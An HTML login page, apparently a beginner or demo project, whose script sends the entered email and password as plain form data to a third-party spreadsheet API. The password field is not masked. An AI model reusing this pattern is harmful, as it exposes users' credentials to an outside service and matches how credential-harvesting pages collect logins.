<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="utf-8">
    <title>Login / Sign Up Form</title>
    <link rel="shortcut icon" href="./assets/img.png">
    <link rel="stylesheet" href="./src/main copy.css">
	<script
		src="https://code.jquery.com/jquery-3.4.1.js"
		integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
		crossorigin="anonymous"></script>
	<script>
        function SubForm (){
			$.ajax({
				url:"https://api.apispreadsheets.com/data/19361/",
				type:"post",
				data:$("#login").serializeArray(),
				success: function(){
					alert("Form Data Submitted :)")
				},
				error: function(){
					alert("There was an error :(")
				}
			});
		}
	</script>
</head>
<body>
    <div class="container">
        <form class="form" id="login">
            <h1 class="form__title">Login</h1>
            <div class="form__message form__message--error"></div>
            <div class="form__input-group">
                <input name = "email" class="form__input" autofocus placeholder="Email"/>
                <div class="form__input-error-message"></div>
            </div>
            <div class="form__input-group">
                <input name = "password" class="form__input" autofocus placeholder="Password"/>
                <div class="form__input-error-message"></div>
            </div>
            <button class="form__button" onclick='SubForm()'>Submit</button>
        </form>
    </div>
    <script src="./src/main copy.js"></script>
</body>
</html>
